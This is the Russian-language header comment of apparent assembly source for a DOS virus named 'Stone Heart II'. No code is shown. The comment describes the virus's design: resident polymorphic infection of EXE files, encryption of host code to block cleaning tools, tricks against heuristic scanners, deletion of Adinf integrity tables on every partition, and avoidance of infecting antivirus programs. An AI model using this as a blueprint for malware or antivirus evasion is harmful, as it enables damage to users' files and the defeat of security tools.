...
;                       Stone Heart II
;
; Резидентный полиморфный вирус переменной длины,  поражающий EXE
; файлы > 4096 байт.
; Шифрует часть кода программы (512 байт после заголовка), благодаря
; чему не лечится Adinf или TbClean.
; Содержит несколько простых, но эффективных приемов против эвристики
; (не обнаруживается DrWeb, F-Prot, AVP и т.д.). Tbav иногда ругается,
; но редко и не сильно (один-два флага).
; Удаляет при старте ОБЩИЕ таблицы Adinf на всех разделах винчестера.
; Занимает в памяти около 5 Кб. Успешно работает в DOS сессии Windows
; 95. Старается не заражать антивирусы.
;
